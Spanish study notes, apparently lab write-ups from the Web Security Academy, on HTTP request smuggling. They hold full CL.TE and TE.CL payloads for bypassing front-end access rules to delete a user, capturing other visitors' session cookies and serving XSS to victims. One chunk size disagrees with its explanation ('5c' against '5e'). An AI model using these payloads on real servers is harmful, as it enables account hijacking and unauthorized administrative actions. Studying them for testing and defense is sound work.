
---
Tags: #CLTE #TECL #smuggling #http #http1 #request #poisoning

---
# Índice

[[#1. ¿Qué es HTTP Request Smuggling?]]
	
[[#2. Confirmación de CL.TE (Front-End usa Content-Length)]]
	[[#Análisis Técnico Detallado]]
	
[[#3. Confirmación de TE.CL (Front-End usa Transfer-Encoding)]]
	[[#Análisis Técnico Detallado]]
	[[#Sobre los tamaños en TE.CL (Importante)]]
	
[[#4. Bypass de seguridad Front-end (CL.TE)]]
	[[#Explicación de la Técnica]]
	
[[#5. Bypass de seguridad front-end (TE.CL)]]
	[[#Análisis Técnico Detallado]]
	
[[#6. Descubrimiento de reescritura en front-end]]
	[[#Paso 1 Payload Inicial]]
	[[#Paso 2 La Captura]]
	[[#Paso 3 La Respuesta Reveladora]]
	
[[#7. Captura de peticiones de otros usuarios (CL.TE)]]
	[[#Explicación Detallada]]
	
[[#8. Entrega de XSS reflejado por Smuggling]]
	[[#Cómo funciona el ataque]]
	
---
### 1. ¿Qué es HTTP Request Smuggling?

El **HTTP Request Smuggling** (contrabando de peticiones) es una técnica que interfiere en la forma en que una secuencia de peticiones HTTP es procesada por una cadena de servidores.

**El Escenario:** Generalmente, las aplicaciones web modernas no tienen un solo servidor. Tienen una cadena:

1. **Front-end (FE):** Balanceador de carga, Proxy Inverso (Nginx, HAProxy), CDN (Akamai, Cloudflare).
    
2. **Back-end (BE):** El servidor que ejecuta la aplicación (Tomcat, Gunicorn, Apache).
    

Para optimizar el rendimiento, el Front-End y el Back-End mantienen abierta una conexión TCP (Keep-Alive) y envían muchas peticiones de distintos usuarios por ese mismo "tubo".

**El Problema:** La vulnerabilidad surge cuando el FE y el BE **no se ponen de acuerdo sobre dónde termina una petición y empieza la siguiente**. Si el atacante envía una petición ambigua, puede engañar al FE para que piense que es una sola petición, mientras que el BE piensa que son dos. Esa "segunda parte" (el contrabando) se queda en la memoria del BE esperando.

**El Resultado:** La petición de contrabando se "pega" al inicio de la **siguiente petición que llegue** (que puede ser de un usuario víctima), alterando su comportamiento.

---
### 2. Confirmación de CL.TE (Front-End usa Content-Length)

En este escenario, el Front-end prioriza la cabecera `Content-Length` (CL), pero el Back-end prioriza `Transfer-Encoding: chunked` (TE).

**Tu Payload:**

```HTTP
POST / HTTP/1.1
Host: 0acb00710319b8098014624000a80077.web-security-academy.net
Content-Length: 47
Transfer-Encoding: chunked

3
123
0

GET /noexisto HTTP/1.1
Test: test
```

#### Análisis Técnico Detallado

1. **Front-end (El Ciego al TE):**
    
    - Ve `Content-Length: 47`. Ignora (o no soporta bien) el `Transfer-Encoding`.
        
    - Cuenta exactamente 47 bytes desde el inicio del cuerpo.
        
    - **Cálculo de Bytes:**
        
        - `3` + `\r\n` (3 bytes)
            
        - `123` + `\r\n` (5 bytes)
            
        - `0` + `\r\n\r\n` (5 bytes) -> _Hasta aquí es un cuerpo chunked válido._
            
        - `GET /noexisto HTTP/1.1` + `\r\n` (24 bytes)
            
        - `Test: test` (10 bytes)
            
        - Total = 47 bytes.
            
    - El FE envía **todo** el bloque al Back-end como una sola petición.
        
2. **Back-end (El que respeta el TE):**
    
    - Ve `Transfer-Encoding: chunked`. La especificación RFC dice que si existen ambas cabeceras, `TE` tiene prioridad.
        
    - Empieza a procesar por trozos (_chunks_):
        
        - Lee el tamaño `3`, lee `123`.
            
        - Lee el tamaño `0`. Esto indica **FIN DE MENSAJE**.
            
    - El BE detiene el procesamiento de la petición aquí.
        
3. **El Contrabando (La "Basura" en el buffer):**
    
    - Los bytes restantes (`GET /noexisto...`) ya llegaron al servidor por el cable, pero el BE no los ha procesado. Se quedan "flotando" en el buffer de entrada del socket.
        
4. **El Impacto (Respuestas Diferenciales):**
    
    - Cuando llegue la **siguiente petición** (puede ser tuya o de una víctima), el BE la leerá inmediatamente después de lo que quedó en el buffer.
        
    - La petición de la víctima se verá así para el BE:
        
        
        
        ```HTTP
        GET /noexisto HTTP/1.1
        Test: testPOST /ruta-real HTTP/1.1 ...
        ```
        
    - Como `/noexisto` no existe, el servidor devuelve un **404 Not Found**. Si recibes un 404 en respuesta a una petición válida posterior, has confirmado la vulnerabilidad.
        

---
### 3. Confirmación de TE.CL (Front-End usa Transfer-Encoding)

Este es el caso inverso y suele ser más peligroso/difícil de calcular. El Front-end procesa por _chunks_, pero el Back-end mira el `Content-Length`.

**Tu Payload:**

```HTTP
POST / HTTP/1.1
Host: 0aa100fc039d8901804ba33600cc0087.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

3a
POST /noexisto HTTP/1.1
Content-Length: 30

test=test
0
```

#### Análisis Técnico Detallado

1. **Front-end (Usa TE):**
    
    - Ve `Transfer-Encoding: chunked`.
        
    - Lee el primer chunk size: `3a` (en hexadecimal es 58 bytes).
        
    - Lee los siguientes 58 bytes (que incluye todo el `POST /noexisto...` hasta `test=test`).
        
    - Lee el `0` final.
        
    - Para el FE, la petición es válida y completa. La envía al BE.
        
2. **Back-end (Usa CL):**
    
    - El BE ignora el TE y mira `Content-Length: 4`.
        
    - Lee **solo los primeros 4 bytes** del cuerpo.
        
    - **¿Cuáles son esos 4 bytes?**
        
        - `3` `a` `\r` `\n` (Nota: en Windows/Standard HTTP el salto de línea son 2 bytes: CR+LF).
            
    - El BE dice: "He terminado con esta petición".
        
3. **El Contrabando:**
    
    - Todo lo que sigue a `3a\r\n` se queda en el buffer del BE:
        
        ```HTTP
        POST /noexisto HTTP/1.1
        Content-Length: 30
        ...
        ```
        
4. **La Siguiente Petición:**
    
    - Cuando llega una nueva petición, se pega detrás de `test=test`.
        
    - El BE procesará la petición contrabandeada `POST /noexisto`.
        

#### Sobre los tamaños en TE.CL (Importante)

En tu ejemplo hay un detalle crucial:

- El `Content-Length: 4` es para engañar al Back-end para que lea _solo_ el inicio del chunk size.
    
- El chunk size `3a` (58 bytes) debe ser lo suficientemente grande para abarcar toda la petición "maliciosa" que quieres colar (`POST /noexisto...`) hasta el final de `test=test`.
    
- **¿Por qué `Content-Length: 30` en la petición inyectada?** En la petición _smuggled_ (la de `/noexisto`), pones un CL de 30 para indicar al servidor cuánto debe esperar de la **siguiente** petición legítima que se pegue al final. Si pones demasiado, la conexión se colgará (time-out) esperando bytes que no llegan.
    

---
### 4. Bypass de seguridad Front-end (CL.TE)

Aquí entramos en la fase de explotación. Usamos la desincronización para saltarnos reglas del Front-end (como "no permitir acceso a `/admin`").

**Tu Payload para ver si funciona y no da error:**

```HTTP
POST / HTTP/1.1
Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
Cookie: session=ns5yFSFX9vuYYcjOknkqIsxpRptOyIs6
Content-Length: 105
Transfer-Encoding: chunked

3
123
0

GET /adada HTTP/1.1
Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
Content-Length: 19

test=test
```

O con un POST a un comentario:

```HTTP
POST / HTTP/1.1
Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
Cookie: session=ns5yFSFX9vuYYcjOknkqIsxpRptOyIs6
Content-Length: 257
Transfer-Encoding: chunked

3
123
0

POST /post/comment HTTP/1.1
Host: 0a7e00470379397b854ef8fa009b0006.web-security-academy.net
Cookie: session=ns5yFSFX9vuYYcjOknkqIsxpRptOyIs6
Content-Length: 300

csrf=i7kjXxAX5mgc3AV2z5gHgHXMyaczoyx5&postId=3&name=a&email=a@a.com&comment=b
```

Payload con el objetivo de borrar usuario:

```HTTP
POST / HTTP/1.1
Host: 0aec0013045dbf428071e96700d90019.web-security-academy.net
Content-Length: 105
Transfer-Encoding: chunked

3
123
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 19

test=test
```

#### Explicación de la Técnica

1. **El Objetivo:**
    
    - El Front-end bloquea cualquier petición que vaya a `/admin`.
        
    - Sin embargo, el Front-end permite peticiones a `/` (la raíz).
        
2. **El Engaño (Smuggling):**
    
    - La petición externa ("envoltorio") va dirigida a `/`, así que el Front-end la deja pasar.
        
    - Dentro del cuerpo, escondemos la petición real a `/admin`.
        
3. **Cabeceras Clave:**
    
    - `Host: localhost`: Muchas veces, el Back-end confía ciegamente en peticiones que parecen venir de "local" o del propio servidor. Al poner `localhost`, eludimos restricciones que comprueban el nombre de dominio.
        
    - `Content-Length: 105`: **Fundamental**. Es la suma de todo el cuerpo.
        
        - Cuerpo Chunked (`3\r\n123\r\n0\r\n\r\n`)
            
        - - Petición smuggled (`GET /admin...` hasta el final de `test=test`).
                
    - `Content-Length: 19` (En la petición inyectada):
        
        - Aquí está el truco. La petición inyectada termina en `test=test`.
            
        - Este CL le dice al Back-end: "La petición a `/admin` tiene un cuerpo de 19 bytes".
            
        - Pero `test=test` son solo 9 bytes. **¿Dónde están los otros 10?**
            
        - El Back-end se quedará esperando 10 bytes más. Estos 10 bytes vendrán del **inicio de la siguiente petición legítima** que llegue al servidor.
            
        - Esto "consume" la siguiente petición y completa la nuestra, ejecutando el borrado del usuario.

---
### 5. Bypass de seguridad front-end (TE.CL)

Este es el ataque espejo al anterior. Aquí engañamos a un Front-end que usa `Transfer-Encoding` para colar una petición a `/admin` en un Back-end que usa `Content-Length`.

**Tu Payload:**

```HTTP
POST / HTTP/1.1
Host: 0a550036035a7c9e800ee42c0083003b.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

5c
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 30

test=test
0


```

#### Análisis Técnico Detallado

1. **Front-end (Usa TE):**
    
    - Lee `Transfer-Encoding: chunked`.
        
    - Lee el primer tamaño de chunk: **`5e`**.
        
        - `5e` en hexadecimal es **94** en decimal.
            
    - El Front-end lee los siguientes 94 bytes. Esto incluye **todo** desde `GET /admin...` hasta el `0` final (y sus saltos de línea).
        
    - Para el Front-end, es una petición inocua de 94 bytes de datos. La deja pasar.
        
2. **Back-end (Usa CL):**
    
    - Ve `Content-Length: 4`.
        
    - Lee: `5` `e` `\r` `\n` (4 bytes).
        
    - Detiene el procesamiento. Piensa que la petición ha acabado.
        
3. **El Contrabando:**
    
    - El resto del bloque (los 94 bytes que el Front-end envió) se interpretan como una **nueva petición**:
        
        ```HTTP
        GET /admin/delete?username=carlos HTTP/1.1
        Host: localhost
        Content-Length: 30
        ...
        ```
        
4. **El "Truco" del Content-Length 30:**
    
    - Fíjate que la petición inyectada termina en `test=test` y un `0` (que aquí actúa como basura/padding).
        
    - Si sumamos los bytes de `test=test` + `0` + saltos de línea, son unos 10-12 bytes.
        
    - Pero hemos declarado `Content-Length: 30`.
        
    - **¿Qué pasa?** El Back-end se queda esperando el resto de los datos. La **siguiente petición** legítima que llegue al servidor será tratada como el resto del cuerpo de esta petición a `/admin`.
        

---
### 6. Descubrimiento de reescritura en front-end

**Concepto:** A veces, aunque logres hacer smuggling a `/admin`, te rechazan. ¿Por qué? Porque el Front-end suele añadir cabeceras "secretas" de confianza cuando reenvía la petición legítima (ej: `X-Forwarded-For`, `X-User-ID`, `X-Internal-Ip`). Si tú inyectas la petición directamente en el Back-end, te faltan esas cabeceras y el Back-end no confía en ti.

Necesitamos **ver** qué cabeceras añade el Front-end.

**La Técnica:** Hacemos smuggling de una petición que envíe datos a un parámetro que se **refleje** en la respuesta (como una búsqueda o un error de login). Dejamos el parámetro "abierto" al final para que la siguiente petición se pegue ahí.

#### Paso 1: Payload Inicial

```HTTP
POST / HTTP/1.1
...
Content-Length: 66
Transfer-Encoding: chunked

3
123
0

POST / HTTP/1.1
Content-Length: 200

search=test
```

- Inyectamos `POST / ... search=test`.
    
- El `Content-Length: 200` es mucho más largo que `search=test` (11 bytes).
    
- El servidor se queda esperando 189 bytes más.
    

#### Paso 2: La Captura

Cuando llega la siguiente petición (que es el Front-end reenviando una nueva solicitud), se pega a `search=test`. Para el Back-end, la variable `search` ahora vale: `testPOST / HTTP/1.1 \r\n X-DLANMf-Ip: 79.117.253.89 ...`

#### Paso 3: La Respuesta Reveladora

El servidor responde al `POST` de búsqueda reflejando el término buscado: `<h1>0 search results for 'testPOST / HTTP/1.1 X-DLANMf-Ip: 79.117.253.89...'</h1>`

¡Bingo! Ahora sabemos que necesitamos añadir la cabecera `X-DLANMf-Ip` con una IP de confianza (normalmente `127.0.0.1` o la que vimos) para acceder al panel de administración.

---

### 7. Captura de peticiones de otros usuarios (CL.TE)

Esta es, posiblemente, la técnica de mayor impacto. Si puedes capturar la petición de un usuario, puedes robar su **Cookie de Sesión** y secuestrar su cuenta.

**Tu Payload:**

```HTTP
POST / HTTP/1.1
...
Content-Length: 280
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=PrA7AmnHRuWRJg6dOb65Gl8yJ5L9cRWJ
Content-Length: 950

csrf=...&comment=prueba
```

#### Explicación Detallada

1. **El Objetivo:** Un formulario de comentarios en un blog (`/post/comment`). Lo que escribas en `comment=` se guarda y se publica.
    
2. **La Inyección:**
    
    - Hacemos smuggling de una petición `POST` real que envía un comentario.
        
    - **El Detalle Crítico:** El parámetro `comment=prueba` está al **final** de la petición.
        
    - El `Content-Length: 950` de la petición inyectada es **enorme**. Mucho más grande que el texto `csrf=...&comment=prueba`.
        
3. **La Trampa:**
    
    - La petición se queda en el Back-end esperando "llenar" esos 950 bytes.
        
    - Llega un usuario víctima navegando por la web. Su petición completa (Cabeceras + Cookies) se pega justo después de `comment=prueba`.
        
4. **El Resultado:**
    
    - El Back-end procesa el comentario. El contenido del comentario será: `pruebaGET / HTTP/1.1 Host: ... Cookie: session=0ToXrDTkiFZZ...`
        
    - Tú (el atacante) vas al blog, lees el comentario "prueba" y ahí ves impresa la cookie de la víctima. Copias la cookie, la pones en tu navegador y eres él.
        

---

### 8. Entrega de XSS reflejado por Smuggling

El **XSS Reflejado** normalmente requiere que engañes a la víctima para que haga clic en un enlace malicioso. Con Request Smuggling, **no necesitas interacción del usuario**. Tú le sirves el XSS directamente.

**Escenario:** La aplicación tiene una vulnerabilidad XSS en la cabecera `User-Agent`. Esto es difícil de explotar normalmente porque no puedes forzar a una víctima a enviar una petición con un User-Agent modificado fácilmente.

**Tu Payload:**

```HTTP
POST / HTTP/1.1
...
Transfer-Encoding: chunked

3
123
0

GET /post?postId=10 HTTP/1.1
User-Agent: "><script>alert(1)</script>
```

#### Cómo funciona el ataque

1. **Smuggling:** Inyectas la petición `GET /post...` que contiene el payload XSS en el User-Agent.
    
2. **Encolado:** Esta petición maliciosa se queda "huérfana" en el Back-end.
    
3. **La Víctima:** Un usuario normal solicita `GET /home`.
    
4. **El Intercambio:**
    
    - El Back-end piensa: "Oh, tengo esta petición pendiente (`GET /post` con el XSS)".
        
    - Procesa esa petición maliciosa y genera la respuesta que incluye el `<script>alert(1)</script>`.
        
    - **¿A quién se la envía?** Se la envía por el socket TCP abierto donde llegó la petición de la víctima.
        
5. **Resultado:** La víctima recibe la respuesta con el script infectado, aunque ella solo pidió `/home`. El código se ejecuta en su navegador (en el contexto de su sesión).

---
